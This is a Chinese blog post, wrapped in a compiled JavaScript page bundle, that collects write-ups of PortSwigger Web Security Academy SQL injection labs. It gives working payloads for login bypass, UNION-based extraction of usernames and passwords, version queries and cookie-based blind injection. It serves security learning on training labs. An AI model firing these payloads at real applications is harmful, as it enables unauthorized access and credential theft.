import{_ as o,r as i,o as l,c,d as s,e as a,a as e,b as t}from"./app-D-TC3Ll_.js";const r="/sake-s-blog/assets/image-20221109195416814-C1ubpfPB.png",u="/sake-s-blog/assets/image-20221109211420823-dxOSk0z_.png",d="/sake-s-blog/assets/image-20221109212705321-Dw1fbAsO.png",g="/sake-s-blog/assets/image-20221109213452475-DSiY7Ka-.png",m="/sake-s-blog/assets/image-20221109213616285-CS1cWVLi.png",k="/sake-s-blog/assets/image-20221110161852585-DN83BDsu.png",b="/sake-s-blog/assets/image-20221110161959250-heeew6RT.png",h="/sake-s-blog/assets/image-20221110163329744-DBoj8SdF.png",_="/sake-s-blog/assets/image-20221110164015098-D_Xvghs5.png",v="/sake-s-blog/assets/image-20221110164235270-dPVQs-mC.png",f="/sake-s-blog/assets/image-20221111121905642-BrJ1s6mh.png",y="/sake-s-blog/assets/image-20221111122210482-DWfl-Q0H.png",w="/sake-s-blog/assets/image-20221111122246286-iOmUgpy2.png",q="/sake-s-blog/assets/image-20221111151636225-C2TJ_Eiv.png",E="/sake-s-blog/assets/image-20221111151724705-BJCgGAGQ.png",L="/sake-s-blog/assets/image-20221111151946791-CXpE-gRZ.png",x="/sake-s-blog/assets/image-20221111152956925-BilJ4-AV.png",S="/sake-s-blog/assets/image-20221111155420535-ZHXF-LY5.png",N="/sake-s-blog/assets/image-20221111160613232-Dy-2zxuC.png",C="/sake-s-blog/assets/image-20221111161135183-2v07g2uF.png",T="/sake-s-blog/assets/image-20221111162051034-B0yKEf3O.png",O="/sake-s-blog/assets/image-20221111162300011-UusOMRRI.png",R="/sake-s-blog/assets/image-20221111162901683-BnfRkC7n.png",I="/sake-s-blog/assets/image-20221111163210546-B6Mi9QHE.png",U="/sake-s-blog/assets/image-20221111163457415-DCD3dzJW.png",j="/sake-s-blog/assets/image-20221111163859550-CnQuH_1K.png",B="/sake-s-blog/assets/image-20221112204213704-CRk0TW4T.png",D="/sake-s-blog/assets/image-20221112205400706-DwVIau2D.png",P="/sake-s-blog/assets/image-20221112205438159-BiMYdowR.png",M="/sake-s-blog/assets/image-20221112210453490-Db3tZpKG.png",A="/sake-s-blog/assets/image-20221112215832981-Bg9y9NkC.png",F="/sake-s-blog/assets/image-20221113171121705-COzkFGCa.png",W="/sake-s-blog/assets/image-20221113171425361-CvPw3S_y.png",Q="/sake-s-blog/assets/image-20221113213111798-Ddbv7UTO.png",H="/sake-s-blog/assets/image-20221113213148104-C8UYlNVb.png",z="/sake-s-blog/assets/image-20221115215315673-C4gzkXoN.png",G="/sake-s-blog/assets/image-20221120104000722-CtO3faZ2.png",Y="/sake-s-blog/assets/image-20221120105032212-DmJDe60R.png",X="/sake-s-blog/assets/image-20221120103940765-BM-NortL.png",Z="/sake-s-blog/assets/image-20221120111356248-CmeAtDeJ.png",V="/sake-s-blog/assets/image-20221120111406745-OoxZmTkM.png",J="/sake-s-blog/assets/image-20221120115115857-BLMpBrzV.png",K="/sake-s-blog/assets/image-20221120115418060-B7_nGnXe.png",$="/sake-s-blog/assets/image-20221120115235579-DkWydmIS.png",ss="/sake-s-blog/assets/image-20221120120155457-BR1jdXoj.png",as="/sake-s-blog/assets/image-20221120121500672-B18LTdR-.png",ns="/sake-s-blog/assets/image-20221120121514302-BPIE0kEL.png",es="/sake-s-blog/assets/image-20230121195535830-I1FT56PP.png",ts="/sake-s-blog/assets/image-20230121201829437-BGdlvYtr.png",ps="/sake-s-blog/assets/image-20230121202308832-Dmws_u13.png",os="/sake-s-blog/assets/image-20230121202402896-BZrgBVg8.png",is="/sake-s-blog/assets/image-20230121204039682-RGXfANuj.png",ls="/sake-s-blog/assets/image-20230121204108869-CtUoyi-b.png",cs="/sake-s-blog/assets/image-20230121204729823-Dn4zMzlC.png",rs="/sake-s-blog/assets/image-20230121205034621-CpoIIviE.png",us="/sake-s-blog/assets/image-20230121212356539-DRoybu6B.png",ds="/sake-s-blog/assets/image-20230121212310205-DzCJyFXc.png",gs="/sake-s-blog/assets/image-20230121213025258-dIoZSAgL.png",ms="/sake-s-blog/assets/image-20230121213314589-xjDt0hOq.png",ks="/sake-s-blog/assets/image-20230121214406213-U7seVLt3.png",bs="/sake-s-blog/assets/image-20230121215425444-DFkBIIU5.png",hs="/sake-s-blog/assets/image-20230121215722468-DwuhaSLP.png",_s="/sake-s-blog/assets/image-20230121221153611-BBhC7zHW.png",vs="/sake-s-blog/assets/image-20230121221028401-BkymRurF.png",fs="/sake-s-blog/assets/image-20230121221556207-C9DDmCtL.png",ys="/sake-s-blog/assets/image-20230121222227366-8ebn37h4.png",ws="/sake-s-blog/assets/image-20230121222440470-BpRGEwQa.png",qs="/sake-s-blog/assets/image-20230121223137509-9atsbxFD.png",Es="/sake-s-blog/assets/image-20230121224629671-BCpd_rg5.png",Ls="/sake-s-blog/assets/image-20230121225512454-CwSFI_kW.png",xs="/sake-s-blog/assets/image-20230121230125056-CVOiJlMq.png",Ss="/sake-s-blog/assets/image-20230121231014081-BDflQVB_.png",Ns="/sake-s-blog/assets/image-20230121231332991-BofGOD8-.png",Cs="/sake-s-blog/assets/image-20230107220209776-o-G-jOcl.png",Ts="/sake-s-blog/assets/image-20230107221854254-k5k9YwhJ.png",Os="/sake-s-blog/assets/image-20230107222019669-BHvnBoC3.png",p="/sake-s-blog/assets/image-20230107223152334-BIYkKsJv.png",Rs="/sake-s-blog/assets/image-20230107225504039-D_xj2KPx.png",Is="/sake-s-blog/assets/image-20230114201404990-X_Gq-oI0.png",Us="/sake-s-blog/assets/image-20230114201517130-Dof_2fT0.png",js="/sake-s-blog/assets/image-20230114201602470-DdKCJCae.png",Bs="/sake-s-blog/assets/image-20230121170906395-CZoyQOmn.png",Ds="/sake-s-blog/assets/image-20230121171029688-B3QFqfTh.png",Ps="/sake-s-blog/assets/image-20230121171824854-DUVohxI0.png",Ms="/sake-s-blog/assets/image-20230121172250187-B2kOXAiR.png",As="/sake-s-blog/assets/image-20230106203154552-BO3xdU7Q.png",Fs="/sake-s-blog/assets/image-20230106210738994-DzTyBbr1.png",Ws="/sake-s-blog/assets/image-20230106210907926-DN_M1Aa5.png",Qs="/sake-s-blog/assets/image-20230114205315477-C5fGgfzW.png",Hs="/sake-s-blog/assets/image-20230116135557860-BGpmYcKm.png",zs="/sake-s-blog/assets/image-20230116145328504-BfCDzA2T.png",Gs="/sake-s-blog/assets/image-20230116145952241-tiZMCZlJ.png",Ys="/sake-s-blog/assets/image-20230116150138845-CzkuEnfP.png",Xs="/sake-s-blog/assets/image-20230116150440574-DdzNphag.png",Zs="/sake-s-blog/assets/image-20230116150619727-1NtUj4t_.png",Vs="/sake-s-blog/assets/image-20230116150913593-CKIA80W5.png",Js="/sake-s-blog/assets/image-20230116151126737--GAcK6H3.png",Ks="/sake-s-blog/assets/image-20230116152005706-KQZA6uSY.png",$s="/sake-s-blog/assets/image-20230116154940007-09W1tPwf.png",sa="/sake-s-blog/assets/image-20230116160651129-CsIzbc3c.png",aa="/sake-s-blog/assets/image-20230116160900152-BDFuHf6F.png",na="/sake-s-blog/assets/image-20230116161022526-I3SW6xi_.png",ea="/sake-s-blog/assets/image-20230116162304406-CuDfMSm9.png",ta="/sake-s-blog/assets/image-20230116162714537-h9I2MnDn.png",pa="/sake-s-blog/assets/image-20230116162932834-BUdv3alL.png",oa="/sake-s-blog/assets/image-20230116162828254-omCI7xSl.png",ia="/sake-s-blog/assets/image-20230116163912344-2TBWu2mQ.png",la="/sake-s-blog/assets/image-20230116164158236-BuGAXQ2z.png",ca="/sake-s-blog/assets/image-20230116170754861-DuhqBtGK.png",ra="/sake-s-blog/assets/image-20230116171448917-CdnDvfhF.png",ua="/sake-s-blog/assets/image-20230116171724091-DF-wotLi.png",da="/sake-s-blog/assets/image-20230116171902557-BGE8npjz.png",ga="/sake-s-blog/assets/image-20230116174416947-jbTLhSPZ.png",ma="/sake-s-blog/assets/image-20230116174054412-BNhCG-Ja.png",ka="/sake-s-blog/assets/image-20230116175647089-BimzebiP.png",ba="/sake-s-blog/assets/image-20230116175351092-BHBnV4-4.png",ha="/sake-s-blog/assets/image-20230116175829634-DwfCKUqW.png",_a="/sake-s-blog/assets/image-20230116175947791-C2b3AEoD.png",va="/sake-s-blog/assets/image-20230119153926662-9AZh2OYV.png",fa="/sake-s-blog/assets/image-20230119153826185-XRnjyYM4.png",ya="/sake-s-blog/assets/image-20230119153832991-iXcy7Eem.png",wa="/sake-s-blog/assets/image-20230119154132529-D78zszQi.png",qa="/sake-s-blog/assets/image-20230119154934430-C44OcN7y.png",Ea="/sake-s-blog/assets/image-20230119154926616-Da2RedgH.png",La="/sake-s-blog/assets/image-20230121143659203-dSG139Yy.png",xa="/sake-s-blog/assets/image-20230121150707727-B5kWlk-P.png",Sa="/sake-s-blog/assets/image-20230121160340166-CmC-pdeC.png",Na="/sake-s-blog/assets/image-20230121145748631-DTaBiNmL.png",Ca="/sake-s-blog/assets/image-20230121161558805-Dgv6L0py.png",Ta="/sake-s-blog/assets/image-20230121161048427-Cz0jOTWl.png",Oa="/sake-s-blog/assets/image-20230121161239866-CGlq0aqV.png",Ra="/sake-s-blog/assets/image-20230121162611579-oK8247sW.png",Ia="/sake-s-blog/assets/image-20230121162556918-DBE3BkqC.png",Ua="/sake-s-blog/assets/image-20230121162853063-olyMHLr_.png",ja="/sake-s-blog/assets/image-20230121162844545-DltxD9MI.png",Ba="/sake-s-blog/assets/image-20230121163004976-Yfwn-Ok4.png",Da="/sake-s-blog/assets/image-20230121165608772-Ime65w28.png",Pa="/sake-s-blog/assets/image-20230121231859194-DfG4XlfB.png",Ma="/sake-s-blog/assets/image-20230121232448970-Drj8wMEs.png",Aa="/sake-s-blog/assets/image-20230121232548653-D9kd3aMd.png",Fa="/sake-s-blog/assets/image-20230121232746116-CSaDfPQM.png",Wa="/sake-s-blog/assets/image-20230121232838128-BhIKciHz.png",Qa="/sake-s-blog/assets/image-20230121233216467-BuazAm8V.png",Ha="/sake-s-blog/assets/image-20230121233351378-C3gCBAvE.png",za="/sake-s-blog/assets/image-20230121233836789-ngmQGQ1C.png",Ga="/sake-s-blog/assets/image-20230121233940849-CIQWngHL.png",Ya="/sake-s-blog/assets/image-20230121234031120-BEFrgaou.png",Xa="/sake-s-blog/assets/image-20230121234502121-BVJ7wC6j.png",Za="/sake-s-blog/assets/image-20230121234537455-Drm78jJt.png",Va="/sake-s-blog/assets/image-20230204171127553-Bbf2eYmx.png",Ja="/sake-s-blog/assets/image-20230204171216075-CX0euws8.png",Ka="/sake-s-blog/assets/image-20230204171318084-NHFmmskc.png",$a={},sn=t('<blockquote><p>之前将PortSwigger的每个Writeup都作为单独的文章，导致博客被这个刷屏😩</p><p>现在将这些Writeup做个汇总，包含这几个部分📚：</p><ul><li><p>SQLI</p></li><li><p>XSS</p></li><li><p>SSTI</p></li><li><p>命令注入</p></li><li><p>目录遍历</p></li><li><p>CORS</p></li><li><p>Authentication</p></li><li><p>越权</p></li></ul></blockquote><blockquote><p><strong>本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。</strong></p></blockquote><h1 id="sqli" tabindex="-1"><a class="header-anchor" href="#sqli"><span><strong>SQLI</strong></span></a></h1><p><strong>想到之前sql注入一直都只是用sqlmap一把梭，🥬🐶手注完全不会（😭别骂了，再骂人都要傻了），所以想打个burp官方的靶场先😋，记录一下📝。</strong></p><p>（多图，注意流量，有些图片可能加载不成功）</p><p><img src="'+r+'" alt="image-20221109195416814"></p><blockquote><p><strong>SQL 注入 (SQLi) 是一种网络安全漏洞，允许攻击者干扰应用程序对其数据库的查询。它通常允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序本身能够访问的任何其他数据。在许多情况下，攻击者可以修改或删除这些数据，从而导致应用程序的内容或行为发生持续变化。在某些情况下，攻击者可以升级 SQL 注入攻击以破坏底层服务器或其他后端基础架构，或执行拒绝服务攻击。</strong></p></blockquote><hr><h2 id="where子句中的sql注入漏洞允许检索隐藏数据" tabindex="-1"><a class="header-anchor" href="#where子句中的sql注入漏洞允许检索隐藏数据"><span><strong>WHERE子句中的SQL注入漏洞允许检索隐藏数据</strong></span></a></h2><blockquote><p><strong>草🌿，做完了还不能再次访问靶场复现的，会被直接重定向到 https://portswigger.net ，直接丢个payload吧</strong></p><p>补充：这里我们了解一下如何使用<strong>注释</strong>来<strong>截断</strong>🚫查询并删除原始查询中您输入之后的部分</p><table><thead><tr><th>数据库</th><th>语句</th></tr></thead><tbody><tr><td>甲骨文</td><td>--comment</td></tr><tr><td>微软</td><td>--comment<br>/*comment*/</td></tr><tr><td>PostgreSQL</td><td>--comment<br>/*comment*/</td></tr><tr><td>MySQL</td><td>#comment<br>-- comment <strong>[注意双破折号后的空格]</strong><br>/*comment*/</td></tr></tbody></table></blockquote><p><img src="'+u+`" alt="image-20221109211420823"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39; or 1=1--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="允许绕过登录的sql注入漏洞" tabindex="-1"><a class="header-anchor" href="#允许绕过登录的sql注入漏洞"><span><strong>允许绕过登录的SQL注入漏洞</strong></span></a></h2><blockquote><p>用户进行用户名和密码验证时，网站需要查询数据库。查询数据库就是执行类似于这样的SQL语句<code>SELECT * FROM admin WHERE Username= &#39;username&#39; AND Password= &#39;password&#39;</code>，由于网站后台在进行数据库查询的时候没有对<strong>单引号</strong>进行过滤，当输入用户名和万能密码<code>&#39; or 1=&#39;1</code>（也可以使用上一题的<code>&#39; or 1=1--</code>）时，执行的SQL语句为<code>SELECT * FROM admin WHERE Username= &#39;username&#39; or 1=&#39;1&#39; AND Password= &#39;password&#39; or 1=&#39;1&#39;</code>，我们可以发现这个逻辑运算结果恒为TRUE。SQL语句的查询结果为TRUE，就意味着认证成功，也可以登录到系统中。</p></blockquote><p>点击打开My account，进入登录界面</p><p><img src="`+d+'" alt="image-20221109212705321"></p><p>尝试使用万能密码<code>&#39; or 1=&#39;1</code>登录</p><p><img src="'+g+'" alt="image-20221109213452475"></p><p>成功登录到administrator</p><p><img src="'+m+`" alt="image-20221109213616285"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">admin&#39; or 1=&#39;1</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="union攻击查询返回的列数" tabindex="-1"><a class="header-anchor" href="#union攻击查询返回的列数"><span><strong>UNION攻击查询返回的列数</strong></span></a></h2><blockquote><p><strong>执行SQL注入UNION攻击时，有两种有效的方法来确定从原始查询返回多少列。</strong></p><ul><li><p>第一种方法涉及注入一系列ORDER BY子句，并递增指定的列索引，直到发生错误❌为止。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">&#39; ORDER BY 1-- </span>
<span class="line">&#39; ORDER BY 2-- </span>
<span class="line">&#39; ORDER BY 3-- </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这一系列有效负载修改了原始查询，以按照结果集中的不同列对结果进行排序。order by子句中的列可以通过其索引指定，因此您不需要知道任何列的名称。当指定的列索引超过结果集中实际列的数量时，数据库返回一个错误，例如：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">The ORDER BY position number 3 is out of range of the number of items in the select list.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>应用程序可能在其HTTP响应中实际返回数据库错误，或者它可能返回一个通用错误，或者只是不返回任何结果。如果您可以检测到应用程序响应中的一些差异，您就可以推断出查询返回了多少列。</p><p>例如：假设注入点是原始查询的WHERE子句中带引号的字符串，则可以提交order by 1语句的意思是根据第一个字段排序,比如我的USER表有四个字段：</p><table><thead><tr><th>username</th><th>nickname</th><th>password</th><th>identity</th></tr></thead><tbody><tr><td>sake</td><td>sake</td><td>f4k3P@Ssw0rd</td><td>admin</td></tr><tr><td>visitor</td><td>visitor</td><td>123456</td><td>visitor</td></tr></tbody></table><p><code>order by 1</code>效果等同于<code>order by username</code>，而如果<code>order by 5</code>就会报错，因为超过了最大列数4。</p></li><li><p>第二种方法涉及提交一系列UNION SELECT有效负载，指定不同数量的空值:</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">&#39; UNION SELECT NULL-- </span>
<span class="line">&#39; UNION SELECT NULL,NULL-- </span>
<span class="line">&#39; UNION SELECT NULL,NULL,NULL-- </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果null的数目与列的数目不匹配，则数据库返回一个错误，例如:</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>使用UNION，INTERSECT或EXCEPT运算符组合的所有查询在其目标列表中必须具有相等数量的表达式。同样，应用程序实际上可能返回此错误消息，或者可能仅返回一般错误或没有结果。当空数与列数匹配时，数据库将在结果集中返回另一行，其中每一列均包含空值。对产生的HTTP响应的影响取决于应用程序的代码。</p><p><strong>需要注意的是：</strong></p><ul><li>使用NULL作为UNION SELECT注入查询返回值的原因是每列中的数据类型必须在原始查询和注入查询之间兼容。由于NULL可以转换为每种常用的数据类型，因此使用NULL可以最大限度地提高在列计数正确时成功的机会。</li><li>用来注释的 <strong>双破折号--</strong> 可以注释掉注入点之后的原始查询的其余部分。但在MySQL上，双破折号序列后面必须跟一个空格，或者直接使用 <strong>井号#</strong> 来进行注释。</li></ul></li></ul></blockquote><p>使用第二种方法，当指定一个和两个空值时报错</p><p><img src="`+k+'" alt="image-20221110161852585"></p><p>当指定三个空值时没有报错，成功解决Lab</p><p><img src="'+b+`" alt="image-20221110161959250"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39; UNION SELECT NULL,NULL,NULL--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="union攻击查找包含文本的列" tabindex="-1"><a class="header-anchor" href="#union攻击查找包含文本的列"><span><strong>UNION攻击查找包含文本的列</strong></span></a></h2><blockquote><p>任务是让数据库检索并取回字符串<code>&#39;kTe3Gu&#39;</code>，类似于上题，我们使用UNION SELECT提交有效负载，再指定某一字段为<code>&#39;kTe3Gu&#39;</code>。</p></blockquote><p><img src="`+h+'" alt="image-20221110163329744"></p><p>先使用上一题的方法判断列数，这里略去，经判断为列数为3。然后先指定第一个字段为<code>&#39;kTe3Gu&#39;</code>，显示报错</p><p><img src="'+_+'" alt="image-20221110164015098"></p><p>尝试指定第二个字段为<code>&#39;kTe3Gu&#39;</code>，没有报错，成功解决Lab</p><p><img src="'+v+`" alt="image-20221110164235270"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Pets&#39; UNION SELECT NULL,&#39;kTe3Gu&#39;,NULL--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="union攻击从其他表中检索数据" tabindex="-1"><a class="header-anchor" href="#union攻击从其他表中检索数据"><span><strong>UNION攻击从其他表中检索数据</strong></span></a></h2><blockquote><p>任务：该数据库包含一个不同的表，称为 <code>users</code>, 列称为 <code>username</code>和 <code>password</code>。通过UNION攻击，检索所有用户名和密码，并使用该信息以 <code>administrator</code>用户。</p></blockquote><p>先用上上题的方法判断列数，这里略去，经检验列数为2。然后用上一题的方法查找包含文本的列，经检验两列都包含文本。然后使用<code>&#39;UNION SELECT username,password FROM users--</code> 从<code>users</code>里检索所有<code>username</code>和<code>password</code>，我们可以看到<code>administrator</code>的用户名和密码都被返还了</p><p><img src="`+f+'" alt="image-20221111121905642"></p><p>我们尝试使用<code>administrator</code>的账号登录，成功以管理员身份登录</p><p><img src="'+y+'" alt="image-20221111122210482"></p><p><img src="'+w+`" alt="image-20221111122246286"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39;UNION SELECT username,password FROM users-- </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="union-攻击在单个列中检索多个值" tabindex="-1"><a class="header-anchor" href="#union-攻击在单个列中检索多个值"><span><strong>UNION 攻击在单个列中检索多个值</strong></span></a></h2><blockquote><p>任务是将同一列的<code>username</code>和<code>password</code>一起输出，确定<code>administrator</code>对应的密码是什么。</p><p>我们首先要了解一下<strong>SQL字符串连接</strong>的方法：</p><table><thead><tr><th>数据库</th><th>语句</th></tr></thead><tbody><tr><td>甲骨文</td><td>&#39;foo&#39;||&#39;bar&#39;</td></tr><tr><td>微软</td><td>&#39;foo&#39;+&#39;bar&#39;</td></tr><tr><td>PostgreSQL</td><td>&#39;foo&#39;||&#39;bar&#39;</td></tr><tr><td>MySQL</td><td>&#39;foo&#39; &#39;bar&#39;<strong>[注意两个字符串之间的空格]</strong><br> CONCAT(&#39;foo&#39;,&#39;bar&#39;)</td></tr></tbody></table><p>所以我们想到可以用这些语句来将<code>username</code>和<code>password</code>连接</p></blockquote><p>还是老规矩判断列数，列数为2。然后查找包含文本的列，第二列包含文本。然后使用<code>&#39;UNION SELECT NULL,username||password FROM users--</code> 从<code>users</code>里检索第二列的<code>username</code>和<code>password</code>，我们可以看到administrator的用户名和密码都被返还了，但是两个字符串黏在一起了</p><p><img src="`+q+'" alt="image-20221111151636225"></p><p>我们在中间添加一段字符串来区分<code>username</code>和<code>password</code></p><p><img src="'+E+'" alt="image-20221111151724705"></p><p>尝试登录administrator，成功以管理员身份登录</p><p><img src="'+L+`" alt="image-20221111151946791"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Pets&#39;UNION SELECT NULL,username||&#39;^^^^^^&#39;||password FROM users--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="查询oracle上的数据库类型和版本" tabindex="-1"><a class="header-anchor" href="#查询oracle上的数据库类型和版本"><span><strong>查询Oracle上的数据库类型和版本</strong></span></a></h2><blockquote><p>任务是使数据库检索以下字符串：&#39;Oracle Database 11g Express Edition Release 11.2.0.2.0 -64bit Production, PL/SQL Release 11.2.0.2.0-Production, CORE-11.2.0.2.0-Production，,TNS forLinux: Version 11.2.0.2.0 - Production,NLSRTL Version 11.2.0.2.0 - Production&#39;</p><p>我们首先要了解如何<strong>查询数据库的类型和版本</strong>：</p><table><thead><tr><th>数据库</th><th>语句</th></tr></thead><tbody><tr><td>甲骨文</td><td>SELECT banner FROM v$version<br>SELECT version FROM v$instance</td></tr><tr><td>微软</td><td>SELECT @@version</td></tr><tr><td>PostgreSQL</td><td>SELECT version()</td></tr><tr><td>MySQL</td><td>SELECT @@version</td></tr></tbody></table></blockquote><p>前两步同上述Lab，然后利用查询数据库类型和版本的语句进行版本查询，成功解决Lab</p><p><img src="`+x+`" alt="image-20221111152956925"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Lifestyle&#39; UNION SELECT BANNER,NULL FROM v$version--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="查询mysql和微软上的数据库类型和版本" tabindex="-1"><a class="header-anchor" href="#查询mysql和微软上的数据库类型和版本"><span>查询MySQL和微软上的数据库类型和版本</span></a></h2><blockquote><p>这个Lab和上面那题基本一样的做法，唯一要注意的是，不同数据库之间注释的方法不同。</p></blockquote><p><img src="`+S+`" alt="image-20221111155420535"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39;UNION SELECT @@version,NULL-- comment</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="列出非-oracle-数据库上的数据库内容" tabindex="-1"><a class="header-anchor" href="#列出非-oracle-数据库上的数据库内容"><span><strong>列出非 Oracle 数据库上的数据库内容</strong></span></a></h2><blockquote><p>这里我们了解一下如何查询不同数据库的数据库内容（您可以列出数据库中存在的表，以及这些表包含的列）：</p><table><thead><tr><th>数据库</th><th>语句</th></tr></thead><tbody><tr><td>甲骨文</td><td>SELECT * FROM all_tables<br>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr><tr><td>微软</td><td>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr><tr><td>PostgreSQL</td><td>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr><tr><td>MySQL</td><td>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</td></tr></tbody></table></blockquote><p>前两步同上述Lab，这里我们使用<code>&#39;UNION SELECT table_name,NULL FROM information_schema.tables-- qq</code>来查询表名，返还了很多表，往下翻找到users的表</p><p><img src="`+N+'" alt="image-20221111160613232"></p><p>再使用<code>&#39;UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = &#39;users_etflvr&#39;-- qq</code>查询列名，查看这个表包含的列，看到关键的username和password相关的列</p><p><img src="'+C+'" alt="image-20221111161135183"></p><p>然后使用<code>&#39;UNION SELECT username_wpfvrw,password_lqkvfp FROM users_etflvr-- qq</code>来查询username列和password列的字段内容，发现administrator的用户名和密码</p><p><img src="'+T+'" alt="image-20221111162051034"></p><p>登录administrator成功解决Lab</p><p><img src="'+O+`" alt="image-20221111162300011"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Pets&#39;UNION SELECT table_name,NULL FROM information_schema.tables-- qq</span>
<span class="line">/filter?category=Pets&#39;UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = &#39;users_etflvr&#39;-- qq</span>
<span class="line">/filter?category=Pets&#39;UNION SELECT username_wpfvrw,password_lqkvfp FROM users_etflvr-- qq</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="列出oracle上的数据库内容" tabindex="-1"><a class="header-anchor" href="#列出oracle上的数据库内容"><span><strong>列出Oracle上的数据库内容</strong></span></a></h2><blockquote><p>这个Lab和上面那题基本一样的做法，这里省去一些步骤</p></blockquote><p>查询到users表<img src="`+R+'" alt="image-20221111162901683"></p><p>查询到username列和password列</p><p><img src="'+I+'" alt="image-20221111163210546"></p><p>查询username和password的字段内容</p><p><img src="'+U+'" alt="image-20221111163457415"></p><p>以administrator登录，成功解决Lab</p><p><img src="'+j+`" alt="image-20221111163859550"></p><p>payload：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39;UNION SELECT table_name,NULL FROM all_tables--</span>
<span class="line">/filter?category=Gifts&#39;UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = &#39;USERS_REILEX&#39;--</span>
<span class="line">/filter?category=Gifts&#39;UNION SELECT USERNAME_IOYYXQ,PASSWORD_LFYLDI FROM USERS_REILEX--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="带有条件响应的sql盲注" tabindex="-1"><a class="header-anchor" href="#带有条件响应的sql盲注"><span>带有条件响应的SQL盲注</span></a></h2><blockquote><p><strong>刚开始以为像上面Lab一样是GET提交，试了几次发现不对劲（<s>草，怎么100也不报错</s>❓），瞄了一眼官方的题解，原来注入点在cookie</strong>💫</p></blockquote><p><img src="`+B+'" alt="image-20221112204213704"></p><p>在hackbar上操作不是很方便，决定改用burp，直接试着在cookie接个<code>&#39;and&#39;1&#39;=&#39;1</code>然后发包，接着再试着<code>&#39;and&#39;1&#39;=&#39;2</code>，注意到两者的返回包的长度不同</p><p><img src="'+D+'" alt="image-20221112205400706"></p><p><img src="'+P+'" alt="image-20221112205438159"></p><p>直接将两个包发到burp的comparer进行比较，发现逻辑运算结果为true的多返还了<code>Welcome back!</code></p><p><img src="'+M+'" alt="image-20221112210453490"></p><p>这里我们使用<code>&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a</code> 这条语句来确认存不存在users这个表，返回为真</p><p><img 